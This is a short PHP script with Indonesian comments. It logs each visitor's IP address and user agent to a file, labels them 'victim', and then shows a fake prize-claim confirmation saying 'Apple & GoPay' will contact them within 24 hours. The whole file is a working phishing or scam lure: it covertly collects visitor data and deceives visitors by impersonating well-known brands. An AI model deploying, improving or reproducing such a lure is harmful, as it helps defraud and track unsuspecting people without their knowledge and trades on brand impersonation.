<?php
// ip.php — Logger IP & User-Agent (asli dari Anda, sedikit diperbaiki)

if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ipaddress = $_SERVER['HTTP_CLIENT_IP'] . "\r\n";
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'] . "\r\n";
} else {
    $ipaddress = $_SERVER['REMOTE_ADDR'] . "\r\n";
}

$useragent = " User-Agent: ";
$browser = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';

$file = 'ip.txt';
$victim = "IP: ";
$fp = fopen($file, 'a');

if ($fp) {
    fwrite($fp, $victim);
    fwrite($fp, $ipaddress);
    fwrite($fp, $useragent);
    fwrite($fp, $browser);
    fwrite($fp, "\r\n--------------------\r\n");
    fclose($fp);
}

// Tampilkan halaman "sukses" setelah logging
?>
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Klaim Berhasil!</title>
  <style>
    body {
      background: #e8f5e9;
      color: #2e7d32;
      font-family: Arial, sans-serif;
      text-align: center;
      padding: 60px 20px;
    }
    h1 { color: #1b5e20; margin-bottom: 20px; }
    p { font-size: 18px; }
    .note { margin-top: 40px; font-size: 12px; color: #777; }
  </style>
</head>
<body>
  <h1>✅ Verifikasi Berhasil!</h1>
  <p>Hadiah Anda sedang diproses.</p>
  <p>Tim Apple & GoPay akan menghubungi Anda dalam 24 jam.</p>
  <div class="note">
  </div>
</body>
</html>